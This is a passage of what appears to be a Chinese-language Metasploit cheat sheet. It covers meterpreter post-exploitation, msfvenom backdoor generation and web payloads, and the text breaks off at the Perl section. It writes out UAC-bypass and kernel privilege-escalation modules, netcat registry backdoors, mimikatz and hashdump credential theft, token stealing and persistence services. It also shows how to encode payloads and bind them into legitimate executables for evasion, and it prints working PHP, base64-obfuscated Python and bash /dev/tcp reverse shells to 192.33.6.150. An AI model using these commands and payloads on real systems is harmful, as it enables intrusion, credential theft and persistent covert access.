run post/windows/gather/enum_chrome   #获取Chrome缓存
run post/windows/gather/enum_patches  #补丁信息
run post/windows/gather/enum_domain  #查找域控
```
+ 辅助模块
auxiliary辅助模块在run的情况下，后面需要接配置选项参数，才能进行扫描收集。（注意：注意：需提前设置好路由转发）（注意：这里使用辅助模块，可以在meterpreter会话中直接run+模块+参数运行，也可以在msf控制台中use 模块+配置+run运行）
```
meterpreter > run auxiliary/scanner/portscan/tcp RHOSTS=192.168.9.101 THREADS=50 TIMEOUT=500 RPORTS=1-65535
msf5 > use auxiliary/scanner/portscan/tcp
```
#### 端口转发
PS：-L表示外网主机IP、-r表示内网主机IP、-p、-l表示将内网3389端口转发到外网主机的7777端口
```
portfwd add -L 192.33.6.150 -l 4445 -p 3389 -r 192.168.9.101
```
#### 远程监控+桌面截图
```
enumdesktops  #查看可用的桌面
getdesktop    #获取当前meterpreter 关联的桌面
setdesktop    #设置meterpreter关联的桌面  -h查看帮助
screenshot    #截屏
run vnc       #使用vnc远程桌面连接
```
#### 远程桌面
+ getgui命令

```
#getgui命令
#这里需要注意的是通过getgui命令，虽然可以成功添加用户，但是没有权限远程登录桌面，这里推荐使用enable_rdp脚本添加。
run getgui -h  # 查看帮助
run getgui -e  # 开启远程桌面RDP
run getgui -u qftm -p 123  # 添加用户
run getgui -f 6666 -e  # 3389端口转发到6666
```
+ enable_rdp脚本
```
run post/windows/manage/enable_rdp  #开启远程桌面RDP
run post/windows/manage/enable_rdp USERNAME=qftm PASSWORD=123 # 添加用户
run post/windows/manage/enable_rdp FORWARD=true LPORT=6667  # 将3389端口转发到6667
```
#### 系统提权
`getsystem`
getsystem是由Metasploit-Framework提供的一个模块，它可以将一个管理帐户（通常为本地Administrator账户）提升为本地SYSTEM帐户。
> 1)getsystem创建一个新的Windows服务，设置为SYSTEM运行，当它启动时连接到一个命名管道。
> 2)getsystem产生一个进程，它创建一个命名管道并等待来自该服务的连接。
> 3)Windows服务已启动，导致与命名管道建立连接。
> 4)该进程接收连接并调用ImpersonateNamedPipeClient，从而为SYSTEM用户创建模拟令牌。
> 5)然后用新收集的SYSTEM模拟令牌产生cmd.exe，并且我们有一个SYSTEM特权进程。

#### bypassuac
UAC是在Windows Vista及更高版本操作系统中采用的一种控制机制，它以预见的方式阻止不必要的系统范围更改。
换句话说，它是Windows的一项安全功能，支持你阻止任何对系统未经授权的更改操作行为。UAC确保仅在管理员授权的情况下进行某些更改。如果管理员不允许更改，则不会执行这些更改，并且Windows也不会发生任何的改变。
```
use exploit/windows/local/bypassuac  #进程注入
use exploit/windows/local/bypassuac_comhijack   #COM处理程序劫持
use exploit/windows/local/bypassuac_dotnet_profiler
use exploit/windows/local/bypassuac_eventvwr    #通过Eventvwr注册表项
use exploit/windows/local/bypassuac_fodhelper   #通过FodHelper注册表项
use exploit/windows/local/bypassuac_injection   #内存注入
use exploit/windows/local/bypassuac_injection_winsxs
use exploit/windows/local/bypassuac_sdclt
use exploit/windows/local/bypassuac_silentcleanup
use exploit/windows/local/bypassuac_sluihijack
use exploit/windows/local/bypassuac_vbs
use exploit/windows/local/bypassuac_windows_store_filesys
use exploit/windows/local/bypassuac_windows_store_reg
```
#### 内核漏洞提权
```
use exploit/windows/local/ms10_015_kitrap0d
use exploit/windows/local/ms10_092_schelevator
use exploit/windows/local/ms11_080_afdjoinleaf
use exploit/windows/local/ms13_005_hwnd_broadcast
use exploit/windows/local/ms13_053_schlamperei
use exploit/windows/local/ms13_081_track_popup_menu
use exploit/windows/local/ms13_097_ie_registry_symlink
use exploit/windows/local/ms14_009_ie_dfsvc
use exploit/windows/local/ms14_058_track_popup_menu
use exploit/windows/local/ms14_070_tcpip_ioctl
use exploit/windows/local/ms15_004_tswbproxy
use exploit/windows/local/ms15_051_client_copy_image
use exploit/windows/local/ms15_078_atmfd_bof
use exploit/windows/local/ms16_014_wmi_recv_notif
use exploit/windows/local/ms16_016_webdav
use exploit/windows/local/ms16_032_secondary_logon_handle_privesc
use exploit/windows/local/ms16_075_reflection
use exploit/windows/local/ms16_075_reflection_juicy
use exploit/windows/local/ms18_8120_win32k_privesc
use exploit/windows/local/ms_ndproxy
```
#### 注册表操作+添后门
```
meterpreter > reg -h
Usage: reg [command] [options]
Interact with the target machine's registry.

OPTIONS:

    -d <opt>  注册表中存储值的数据
    -h        帮助手册
    -k <opt>  注册表中键的路径 (E.g. HKLMSoftwareFoo).
    -r <opt>  The remote machine name to connect to (with current process credentials
    -t <opt>  注册表中值的类型 (E.g. REG_SZ).
    -v <opt>  注册表中值的名称 (E.g. Stuff).
    -w        Set KEY_WOW64 flag, valid values [32|64].
COMMANDS:

    enumkey    枚举可获得的键    [-k <key>]
    createkey  注册表中添加键    [-k <key>]
    deletekey  删除注册表中的键  [-k <key>]
    queryclass Queries the class of the supplied key [-k <key>]
    setval     设置一个键值 [-k <key> -v <val> -d <data>]
    deleteval  删除一个键下面存储的值 [-k <key> -v <val>]
    queryval   查看一个键下面值的数据 [-k <key> -v <val>]
```
部分指令演练操作：查看键、值、数据、添加键值
```
//枚举可获得的键
meterpreter > reg enumkey -k HKLM\Software\Intel\PSIS
meterpreter > reg enumkey -k HKLM\Software\Intel\PSIS\PSIS_DECODER
//查看 -k键下的值(-v)
meterpreter > reg queryval -k HKLM\Software\Intel\PSIS\PSIS_DECODER\ -v EnableDVB_SI
//设置一个键值 [-k <key> -v <val> -d <data>]
meterpreter > reg setval -k HKLM\Software\Intel\PSIS\PSIS_DECODER\ -v hack-q -d "hacking"
查看一个键下面值的数据 [-k <key> -v <val>]
meterpreter > reg queryval -k HKLM\Software\Intel\PSIS\PSIS_DECODER\ -v hack-q
```
+ 实战1：通过注册表添加NC后门【主动连接->受害主机主动连接攻击主机】
> 对于在内网受害者主机上设置后门NC主动连接的情况下来说：这种方式其实不是太好用，不推荐【推荐被动连接（稳定）】，为什么这么说呢，因为这种利用方式必须要在受害者主机重启之前在攻击机本地开启本地端口的监听，才能在受害者主机重启之后得到nc反弹回来的shell，同时，在攻击机上当我们退出后门shell的时候，再次监听连接是连接不上的，必须要等到下次受害者主机的重启，对权限维持很不友好！！鸡肋。。。。
```
#枚举run下的键值
reg enumkey -k HKLM\software\microsoft\windows\currentversion\run
#设置键值（-d参数：重启之后，自启动程序不会显示在前台执行，而是转为后台，提高隐蔽性）
reg setval -k HKLM\software\microsoft\windows\currentversion\run -v mtfq_nc -d 'C:windows/system32/nc32.exe -d 192.33.6.150 444 -e cmd.exe'
#查看键值
reg queryval -k HKLM\software\microsoft\windows\currentversion\Run -v mtfq_nc
```
+ 实战2：通过注册表添加NC后门【被动连接->攻击主机主动连接受害主机】
```
#枚举run下的键值
reg enumkey -k HKLM\software\microsoft\windows\currentversion\run
#设置键值（-d参数：重启之后，自启动程序不会显示在前台执行，而是转为后台，提高隐蔽性）
reg setval -k HKLM\software\microsoft\windows\currentversion\run -v mtfq_nc -d 'C:windows/system32/nc32.exe -Ldp 444 -e cmd.exe'
#查看键值
reg queryval -k HKLM\software\microsoft\windows\currentversion\Run -v mtfq_nc
//cmd下开启防火墙的444端口策略
netsh firewall add portopening TCP 444 "FireWall" ENABLE ALL
//做端口转发 -L表示外网主机IP、-r表示内网主机IP、-p、-l表示将内网444端口转发到外网主机的4455端口
portfwd add -L 192.33.6.200 -l 4455 -p 444 -r 192.168.9.101
//然后本地nc主动去连接目标机(目标转发出来的)
nc 192.33.6.150 4455
```
#### 流量抓包
+ 基本指令
```
meterpreter > load sniffer
Loading extension sniffer...Success.
meterpreter > help sniffer

Sniffer Commands
================

    Command             Description
    -------             -----------
    sniffer_dump        Retrieve captured packet data to PCAP file
    sniffer_interfaces  Enumerate all sniffable network interfaces
    sniffer_release     Free captured packets on a specific interface instead of downloading them
    sniffer_start       Start packet capture on a specific interface
    sniffer_stats       View statistics of an active capture
    sniffer_stop        Stop packet capture on a specific interface
```
+ 指令解读
```
load sniffer         #加载第三方工具
sniffer_interfaces   #查看网卡
sniffer_start 2      #选择网卡 开始抓包
sniffer_stats 2      #查看状态
sniffer_dump 2 /tmp/lab1.pcap  #导出pcap数据包
sniffer_release 2              #释放接口上抓取的数据包
sniffer_stop 2                 #停止抓包
```
+ 实战：抓取内网主机通信流量
```
meterpreter > load sniffer 
Loading extension sniffer...Success.
//#查看网卡
meterpreter > sniffer_interfaces 

1 - 'WAN Miniport (Network Monitor)' ( type:3 mtu:1514 usable:true dhcp:false wifi:false )
2 - 'Intel(R) PRO/1000 MT Network Connection' ( type:0 mtu:1514 usable:true dhcp:true wifi:false )
//#选择网卡 开始抓包
meterpreter > sniffer_start 2
[*] Capture started on interface 2 (50000 packet buffer)
//#查看状态
meterpreter > sniffer_stats 2
[*] Capture statistics for interface 2
        packets: 8
        bytes: 468
//#导出pcap数据包
meterpreter > sniffer_dump 2 /tmp/lab1.pcap
//#停止抓包
meterpreter > sniffer_stop 2
```
#### 密码抓取
+ 基本指令
```
meterpreter > load mimikatz
Loading extension mimikatz...[!] Loaded Mimikatz on a newer OS (Windows 7 (6.1 Build 7601, Service Pack 1).). Did you mean to 'load kiwi' instead?
Success.
meterpreter > help mimikatz

Mimikatz Commands
=================

    Command           Description
    -------           -----------
    kerberos          Attempt to retrieve kerberos creds.
    livessp           Attempt to retrieve livessp creds.
    mimikatz_command  Run a custom command.
    msv               Attempt to retrieve msv creds (hashes).
    ssp               Attempt to retrieve ssp creds.
    tspkg             Attempt to retrieve tspkg creds.
    wdigest           Attempt to retrieve wdigest creds.
```
+ 指令解读
```
load mimikatz    #加载mimikatz模块
msv              #获取用户和hash值 
wdigest          #获取内存中的明文密码信息
mimikatz_command -f xx::xx                     #执行mimikatz原始命令
mimikatz_command -f samdump::hashes            #获取用户Hash
mimikatz_command -f sekurlsa::searchPasswords  #获取用户密码
```
#### 哈希获取+哈希传递
+ 哈希获取
	+ hashdump
	`meterpreter > hashdump `
```
#从SAM导出密码哈希 #需要SYSTEM权限
run post/windows/gather/smart_hashdump
```
+ 哈希传递（PTH）
> 开启445端口SMB服务
> 开启admin$共享
```
msf5 > use exploit/windows/smb/psexec
```

#### 令牌操作
##### incognito假冒令牌
```
meterpreter > load incognito 
Loading extension incognito...Success.
meterpreter > help incognito

Incognito Commands
==================

    Command              Description
    -------              -----------
    add_group_user       Attempt to add a user to a global group with all tokens
    add_localgroup_user  Attempt to add a user to a local group with all tokens
    add_user             Attempt to add a user with all tokens
    impersonate_token    Impersonate specified token
    list_tokens          List tokens available under current user context
    snarf_hashes         Snarf challenge/response hashes for every token
```
+ 指令解读
```
load incognito      #加载incognito
list_tokens -u      #列出当前系统可用的token
impersonate_token 'NT AUTHORITYSYSTEM'  #假冒SYSTEM token
or
impersonate_token NT AUTHORITY\SYSTEM  #参数不加单引号需要对特殊字符进行转义
rev2self   #返回原始token
```
+ 实战：假冒令牌登陆其他用户
```
meterpreter > getuid 
Server username: NT AUTHORITYSYSTEM
meterpreter > list_tokens -u

Delegation Tokens Available
========================================
NT AUTHORITYLOCAL SERVICE
NT AUTHORITYNETWORK SERVICE
NT AUTHORITYSYSTEM
WIN-5DTIE0M734EAdministrator

Impersonation Tokens Available
========================================
NT AUTHORITYANONYMOUS LOGON

meterpreter > impersonate_token 'WIN-5DTIE0M734EAdministrator'
[+] Delegation token available
[+] Successfully impersonated user WIN-5DTIE0M734EAdministrator
meterpreter > getuid 
Server username: WIN-5DTIE0M734EAdministrator
meterpreter > shell
Process 3068 created.
Channel 1 created.
Microsoft Windows [�汾 6.1.7601]
��Ȩ���� (c) 2009 Microsoft Corporation����������Ȩ����

C:Windowssystem32>whoami
whoami
win-5dtie0m734eadministrator

C:Windowssystem32>exit
exit
meterpreter >
meterpreter > rev2self 
meterpreter > getuid 
Server username: NT AUTHORITYSYSTEM
meterpreter >
```
##### steal_token窃取令牌
+ 基本指令
```
  ps                    #查看系统进程信息
  steal_token <pid值>   #从指定进程中窃取token
  drop_token           #删除窃取的token
```
+ 实战：窃取其他用户token使用其身份
```
meterpreter > ps

Process List
============

 PID   PPID  Name               Arch  Session  User                           Path
---   ----  ----               ----  -------  ----                           ----
 0     0     [System Process]                                                 
 4     0     System             x64   0                                       
 244   4     smss.exe           x64   0        NT AUTHORITYSYSTEM            SystemRootSystem32smss.exe
 332   316   csrss.exe          x64   0        NT 
 2216  396   vm3dservice.exe    x64   1        WIN-5DTIE0M734EAdministrator  C:WindowsSystem32vm3dservice.exe
 2224  396   vmtoolsd.exe       x64   1        WIN-5DTIE0M734EAdministrator  C:Program FilesVMwareVMware Toolsvmtoolsd.exe
 2236  396   nc32.exe           x86   1        WIN-5DTIE0M734EAdministrator  C:WindowsSystem32nc32.exe

meterpreter > getuid 
Server username: NT AUTHORITYSYSTEM
meterpreter > steal_token 396
Stolen token with username: WIN-5DTIE0M734EAdministrator
meterpreter > getuid 
Server username: WIN-5DTIE0M734EAdministrator
meterpreter > drop_token 
Relinquished token, now running as: WIN-5DTIE0M734EAdministrator
meterpreter > getuid 
Server username: NT AUTHORITYSYSTEM
meterpreter >
```
#### 后门种植+权限维持
##### Persistence启动项后门
```
# Persistence(通过启动项安装)
run persistence -h  # 查看帮助
run persistence -X -i 5 -p 4444 -r 192.33.6.150 
run persistence -U -i 5 -p 4444 -r 192.33.6.150 -L c:\Windows\System32
-X：设置后门在系统启动后自启动。该方式会在HKLMSoftwareMicrosoftWindowsCurrentVersionRun下添加注册表信息。由于权限原因会导致添加失败，后门无法启动。因此在非管理员权限下，不推荐使用该参数
-U：设置后门在用户登录后自启动。该方式会在HKCUSoftwareMicrosoftWindowsCurrentVersionRun下添加注册表信息
-L：后门传到远程主机的位置默认为%TEMP%【上传的是一个vbs脚本的后门程序】
-i：设置反向连接间隔时间为5秒
-P：默认载荷 windows/meterpreter/reverse_tcp
-p：设置反向连接的端口号
-r：设置反向连接的ip地址
```
##### Metsvc服务后门
```
# Metsvc(通过服务安装)
run metsvc -h   #查看帮助
run metsvc -A   #自动安装后门服务
run metsvc -r   #卸载安装的后门服务
```
# MSFvenom
Msfvenom是Metasploit的一个独立有效载荷（payload）生成器，同时也是msfpayload和msfencode的替代品，生成ShellCode（能够获取目标 Shell 的代码）的工具。
+ 指令解读
```
→ Qftm :~/Desktop# msfvenom -h
MsfVenom - a Metasploit standalone payload generator.
Also a replacement for msfpayload and msfencode.
Usage: /usr/bin/msfvenom [options] <var=val>
Example: /usr/bin/msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> -f exe -o payload.exe

Options:
    -l, --list            <type>     列出指定类型的所有模块 类型包括: payloads, encoders, nops, platforms, archs, encrypt, formats, all
    -p, --payload         <payload>  指定payload + 参数任务：设置相关payload选项 (--list payloads to list, --list-options for arguments)
        --list-options               列出指定payload的选项信息 standard, advanced and evasion options
    -f, --format          <format>   指定后门程序输出格式 (use --list formats to list)
    -e, --encoder         <encoder>  指定后门程序编码器 (use --list encoders to list)
        --sec-name        <value>    The new section name to use when generating large Windows binaries. Default: random 4-character alpha string
        --smallest                   Generate the smallest possible payload using all available encoders
        --encrypt         <value>    The type of encryption or encoding to apply to the shellcode (use --list encrypt to list)
        --encrypt-key     <value>    A key to be used for --encrypt
        --encrypt-iv      <value>    An initialization vector for --encrypt
    -a, --arch            <arch>     指定有效载荷和编码器的架构 (use --list archs to list)
        --platform        <platform> 指定载荷payload使用平台 (use --list platforms to list)
    -o, --out             <path>     输出并保存后门程序文件
    -b, --bad-chars       <list>     去除特殊字符（坏字符）: 'x00xff'
    -n, --nopsled         <length>   Prepend a nopsled of [length] size on to the payload
        --pad-nops                   Use nopsled size specified by -n <length> as the total payload size, auto-prepending a nopsled of quantity (nops minus payload length)
    -s, --space           <length>   生成payload的最大长度，就是文件大小。
        --encoder-space   <length>   The maximum size of the encoded payload (defaults to the -s value)
    -i, --iterations      <count>    对有效载荷的编码次数
    -c, --add-code        <path>     指定包含一个额外的win32 shellcode文件
    -x, --template        <path>     捆绑：指定自定义可执行文件用作模板（模板==正常可执行程序）（将木马捆绑到这个可执行程序上）
    -k, --keep                       保留--template行为并将有效载荷作为新线程注入
    -v, --var-name        <value>    Specify a custom variable name to use for certain output formats
    -t, --timeout         <second>   The number of seconds to wait when reading the payload from STDIN (default 30, 0 to disable)
    -h, --help                       帮助手册
```
+ 常用有效攻击载荷
```
windows/shell/bind_tcp
windows/shell/reverse_tcp
windows/meterpreter/bind_tcp
windows/meterpreter/reverse_tcp
windows/x64/shell/bind_tcp 
windows/x64/shell/reverse_tcp
windows/x64/meterpreter/bind_tcp
windows/x64/meterpreter/reverse_tcp

linux/x86/shell/bind_tcp
linux/x86/shell/reverse_tcp
linux/x86/meterpreter/bind_tcp
linux/x86/meterpreter/reverse_tcp
linux/x64/shell/bind_tcp
linux/x64/shell/reverse_tcp
linux/x64/meterpreter/bind_tcp
linux/x64/meterpreter/reverse_tcp
```
+ 有效载荷参数
```
msfvenom -p <payload> --list-options
msfvenom -p windows/meterpreter/reverse_tcp --list-options
```
+ 架构支持
```
msfvenom -l archs

Framework Architectures [--arch <value>]
========================================

    Name
    ----
    aarch64
    armbe
    armle
    cbea
    cbea64
    cmd
    dalvik
    firefox
    java
    mips
    mips64
    mips64le
    mipsbe
    mipsle
    nodejs
    php
    ppc
    ppc64
    ppc64le
    ppce500v2
    python
    r
    ruby
    sparc
    sparc64
    tty
    x64
    x86
    x86_64
    zarch
```
+ 平台支持
```
msfvenom -l platforms

Framework Platforms [--platform <value>]
========================================

    Name
    ----
    aix
    android
    apple_ios
    brocade
    bsd
    bsdi
    cisco
    firefox
    freebsd
    hardware
    hpux
    irix
    java
    javascript
    juniper
    linux
    mainframe
    multi
    netbsd
    netware
    nodejs
    openbsd
    osx
    php
    python
    r
    ruby
    solaris
    unifi
    unix
    unknown
    windows
```
+ 后门格式
```
msfvenom -l formats

Framework Executable Formats [--format <value>]
===============================================

    Name
    ----
    asp
    aspx
    aspx-exe
    axis2
    dll
    elf
    elf-so
    exe
    exe-only
    exe-service
    exe-small
    hta-psh
    jar
    jsp
    loop-vbs
    macho
    msi
    msi-nouac
    osx-app
    psh
    psh-cmd
    psh-net
    psh-reflection
    python-reflection
    vba
    vba-exe
    vba-psh
    vbs
    war

Framework Transform Formats [--format <value>]
==============================================

    Name
    ----
    base32
    base64
    bash
    c
    csharp
    dw
    dword
    hex
    java
    js_be
    js_le
    num
    perl
    pl
    powershell
    ps1
    py
    python
    raw
    rb
    ruby
    sh
    vbapplication
    vbscript
```
+ 后门编码
	+ 编码种类
```
msfvenom -l encoders

Framework Encoders [--encoder <value>]
======================================

    Name                          Rank       Description
    ----                          ----       -----------
    cmd/brace                     low        Bash Brace Expansion Command Encoder
    cmd/echo                      good       Echo Command Encoder
    cmd/generic_sh                manual     Generic Shell Variable Substitution Command Encoder
    cmd/ifs                       low        Bourne ${IFS} Substitution Command Encoder
    cmd/perl                      normal     Perl Command Encoder
    cmd/powershell_base64         excellent  Powershell Base64 Command Encoder
    cmd/printf_php_mq             manual     printf(1) via PHP magic_quotes Utility Command Encoder
    generic/eicar                 manual     The EICAR Encoder
    generic/none                  normal     The "none" Encoder
    mipsbe/byte_xori              normal     Byte XORi Encoder
    mipsbe/longxor                normal     XOR Encoder
    mipsle/byte_xori              normal     Byte XORi Encoder
    mipsle/longxor                normal     XOR Encoder
    php/base64                    great      PHP Base64 Encoder
    ppc/longxor                   normal     PPC LongXOR Encoder
    ppc/longxor_tag               normal     PPC LongXOR Encoder
    ruby/base64                   great      Ruby Base64 Encoder
    sparc/longxor_tag             normal     SPARC DWORD XOR Encoder
    x64/xor                       normal     XOR Encoder
    x64/xor_context               normal     Hostname-based Context Keyed Payload Encoder
    x64/xor_dynamic               normal     Dynamic key XOR Encoder
    x64/zutto_dekiru              manual     Zutto Dekiru
    x86/add_sub                   manual     Add/Sub Encoder
    x86/alpha_mixed               low        Alpha2 Alphanumeric Mixedcase Encoder
    x86/alpha_upper               low        Alpha2 Alphanumeric Uppercase Encoder
    x86/avoid_underscore_tolower  manual     Avoid underscore/tolower
    x86/avoid_utf8_tolower        manual     Avoid UTF8/tolower
    x86/bloxor                    manual     BloXor - A Metamorphic Block Based XOR Encoder
    x86/bmp_polyglot              manual     BMP Polyglot
    x86/call4_dword_xor           normal     Call+4 Dword XOR Encoder
    x86/context_cpuid             manual     CPUID-based Context Keyed Payload Encoder
    x86/context_stat              manual     stat(2)-based Context Keyed Payload Encoder
    x86/context_time              manual     time(2)-based Context Keyed Payload Encoder
    x86/countdown                 normal     Single-byte XOR Countdown Encoder
    x86/fnstenv_mov               normal     Variable-length Fnstenv/mov Dword XOR Encoder
    x86/jmp_call_additive         normal     Jump/Call XOR Additive Feedback Encoder
    x86/nonalpha                  low        Non-Alpha Encoder
    x86/nonupper                  low        Non-Upper Encoder
    x86/opt_sub                   manual     Sub Encoder (optimised)
    x86/service                   manual     Register Service
    x86/shikata_ga_nai            excellent  Polymorphic XOR Additive Feedback Encoder
    x86/single_static_bit         manual     Single Static Bit
    x86/unicode_mixed             manual     Alpha2 Alphanumeric Unicode Mixedcase Encoder
    x86/unicode_upper             manual     Alpha2 Alphanumeric Unicode Uppercase Encoder
    x86/xor_dynamic               normal     Dynamic key XOR Encoder
```

	+ 编码使用

```
# 对payload载荷使用encoder编码器编码number次并去除坏字符
$ msfvenom -p <payload> <payload options> -e <encoder> -i <number> -b "x00" -f <formmat> -o shell.format
```
+ 后门加密
```
msfvenom -l encrypt

Framework Encryption Formats [--encrypt <value>]
================================================

    Name
    ----
    aes256
    base64
    rc4
    xor
```
## 实战攻略
+ 后门生成
```
msfvenom -p <payload> <payload options> -f <format> -o <path>
```
+ 后门编码
```
$ msfvenom -p <payload> <payload options> -e <encoder> -i <encoder times> -n <nopsled> -f <format> -o <path>
```
+ 后门捆绑
```
$ msfvenom -p <payload> <payload options> -x <template path> -k -f <format> -o <path>
```
+ 后门加密
```
$ msfvenom -p <payload> <payload options> --encrypt <value> --encrypt-key <value> --encrypt-iv <value> -f <format> -o <path>
```
## System Payloads
+ Linux
```
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=xxx LPORT=xxx -f elf -o shell.elf
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=xxx LPORT=xxx -f elf -o shell.elf
```
+ MacOS
```
msfvenom -p osx/x86/shell_reverse_tcp LHOST=xxx LPORT=xxx -f macho -o shell
msfvenom -p osx/x64/shell_reverse_tcp LHOST=xxx LPORT=xxx -f macho -o shell
msfvenom -p osx/x64/meterpreter/reverse_tcp LHOST=xxx LPORT=xxx -f macho -o shell
msfvenom -p osx/armle/shell/reverse_tcp LHOST=xxx LPORT=xxx -f macho -o shell
msfvenom -p osx/ppc/shell/reverse_tcp LHOST=xxx LPORT=xxx -f macho -o shell
```
+ Windows
```
Messagebox Test
msfvenom -p windows/messagebox TEXT="hello, it is a test. By Qftm" -f exe -o shell.exe
```
	+ 正向：可执行后门（被动连接）
```
msfvenom -a x86 --platform windows -p windows/shell/bind_tcp RHOST=xxx LPORT=xxx -f exe -o shell.exe
or
msfvenom -p windows/shell/bind_tcp RHOST=xxx LPORT=xxx -f exe -o shell.exe
msfvenom -p windows/meterpreter/bind_tcp RHOST=xxx LPORT=xxx -f exe -o shell.exe
```
	+ 反向：可执行后门（32位/64位）（主动连接）
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=xxx LPORT=xxx -f exe -o shell.exe
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=xxx LPORT=xxx -f exe -o shell.exe
```
+ Android
```
msfvenom -a dalvik -p android/meterpreter/reverse_tcp LHOST=xxx LPORT=xxx -f raw -o shell.apk
or
msfvenom -p android/meterpreter/reverse_tcp LHOST=xxx LPORT=xxx -f raw -o shell.apk
msfvenom -p android/shell/reverse_tcp LHOST=xxx LPORT=xxx -f raw -o shell.apk
```
+ IOS
```
msfvenom -p apple_ios/aarch64/shell_reverse_tcp LHOST=xxx LPORT=xxx -f macho -o shell
msfvenom -p apple_ios/aarch64/meterpreter_reverse_tcp LHOST=xxx LPORT=xxx -f macho -o shell
msfvenom -p apple_ios/armle/meterpreter_reverse_tcp LHOST=xxx LPORT=xxx -f macho -o shell
```
+ Netcat
	+ NC正向连接（被动连接）
```
msfvenom -p linux/x86/shell/bind_tcp rhost=xxx lport=xxx -f elf -o shell.elf
msfvenom -p windows/shell/bind_hidden_tcp rhost=xxx lport=xxx -f exe -o shell.exe
```
	+ NC反向连接（主动连接）
```
msfvenom -p linux/x86/shell/reverse_tcp lhost=xxx lport=xxx -f elf -o shell.elf
msfvenom -p windows/shell/reverse_tcp lhost=xxx lport=xxx -f exe -o shell.exe
```
## Web Payloads
+ asp
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=xxx LPORT=xxx -f asp -o shell.asp
```
+ aspx
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=xxx LPORT=xxx -f aspx -o shell.aspx
```
+ jsp
```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=xxx LPORT=xxx -f raw -o shell.jsp
```
+ war
```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=xxx LPORT=xxx -f war -o shell.war
```
+ jar
```
msfvenom -p java/shell/reverse_tcp LHOST=xxx LPORT=xxx -f jar -o shell.jar
msfvenom -p java/meterpreter/reverse_tcp LHOST=xxx LPORT=xxx -f jar -o shell.jar
```
+ nodejs
```
msfvenom -p nodejs/shell_bind_tcp RHOST=xxx LPORT=xxx -f raw -o shell.js
msfvenom -p nodejs/shell_reverse_tcp LHOST=xxx LPORT=xxx -f raw -o shell.js
msfvenom -p nodejs/shell_reverse_tcp_ssl LHOST=xxx LPORT=xxx -f raw -o shell.js
```
+ php
```
//php模块后门
msfvenom -p php/reverse_php LHOST=xxx LPORT=xxx -f raw -o shell.php
msfvenom -p php/meterpreter/reverse_tcp LHOST=xxx LPORT=xxx -f raw -o shell.php
//unix cmd php后门
msfvenom -p cmd/unix/reverse_php_ssl LHOST=xxx LPORT=xxx -f raw -o shells.php
// shells.php
php -r '$ctxt=stream_context_create(["ssl"=>["verify_peer"=>false,"verify_peer_name"=>false]]);while($s=@stream_socket_client("ssl://192.33.6.150:9999",$erno,$erstr,30,STREAM_CLIENT_CONNECT,$ctxt)){while($l=fgets($s)){exec($l,$o);$o=implode("n",$o);$o.="n";fputs($s,$o);}}'&
```
+ python
```
//thon模块后门
msfvenom -p python/shell_reverse_tcp LHOST=xxx LPORT=xxx -f raw -o shell.py
msfvenom -p python/shell_reverse_tcp_ssl LHOST=xxx LPORT=xxx -f raw -o shell.py
msfvenom -p python/meterpreter/reverse_tcp LHOST=xxx LPORT=xxx -f raw -o shell.py
//ix cmd python后门
msfvenom -p cmd/unix/reverse_python LHOST=xxx LPORT=xxx -f raw -o shell.py
msfvenom -p cmd/unix/reverse_python_ssl LHOST=xxx LPORT=xxx -f raw -o shells.py
//t shell.py
python -c "exec(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('aW1wb3J0IHNvY2tldCAgICAgICwgICBzdWJwcm9jZXNzICAgICAgLCAgIG9zICAgICA7ICAgICAgICBob3N0PSIxOTIuMzMuNi4xNTAiICAgICA7ICAgICAgICBwb3J0PTk5OTkgICAgIDsgICAgICAgIHM9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCAgICAgICwgICBzb2NrZXQuU09DS19TVFJFQU0pICAgICA7ICAgICAgICBzLmNvbm5lY3QoKGhvc3QgICAgICAsICAgcG9ydCkpICAgICA7ICAgICAgICBvcy5kdXAyKHMuZmlsZW5vKCkgICAgICAsICAgMCkgICAgIDsgICAgICAgIG9zLmR1cDIocy5maWxlbm8oKSAgICAgICwgICAxKSAgICAgOyAgICAgICAgb3MuZHVwMihzLmZpbGVubygpICAgICAgLCAgIDIpICAgICA7ICAgICAgICBwPXN1YnByb2Nlc3MuY2FsbCgiL2Jpbi9iYXNoIik=')[0]))"
//t shells.py
python -c "exec(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zLHNzbApzbz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULHNvY2tldC5TT0NLX1NUUkVBTSkKc28uY29ubmVjdCgoJzE5Mi4zMy42LjE1MCcsOTk5OSkpCnM9c3NsLndyYXBfc29ja2V0KHNvKQp6Rj1GYWxzZQp3aGlsZSBub3QgekY6CglkYXRhPXMucmVjdigxMDI0KQoJaWYgbGVuKGRhdGEpPT0wOgoJCXpGID0gVHJ1ZQoJcHJvYz1zdWJwcm9jZXNzLlBvcGVuKGRhdGEsc2hlbGw9VHJ1ZSxzdGRvdXQ9c3VicHJvY2Vzcy5QSVBFLHN0ZGVycj1zdWJwcm9jZXNzLlBJUEUsc3RkaW49c3VicHJvY2Vzcy5QSVBFKQoJc3Rkb3V0X3ZhbHVlPXByb2Muc3Rkb3V0LnJlYWQoKSArIHByb2Muc3RkZXJyLnJlYWQoKQoJcy5zZW5kKHN0ZG91dF92YWx1ZSkK')[0]))"
```
+ bash
```
#unix cmd bash后门
msfvenom -p cmd/unix/reverse_bash LHOST=xxx LPORT=xxx -f raw -o shell.sh 
# cat shell.sh
0<&33-;exec 33<>/dev/tcp/192.33.6.150/9999;sh <&33 >&33 2>&33
```
+ perl
```
# unix cmd perl后门
msfvenom -p cmd/unix/reverse_perl LHOST=xxx LPORT=xxx -f raw -o shell.pl
msfvenom -p cmd/unix/reverse_perl_ssl LHOST=xxx LPORT=xxx -f raw -o shells.pl
# cat shell.pl
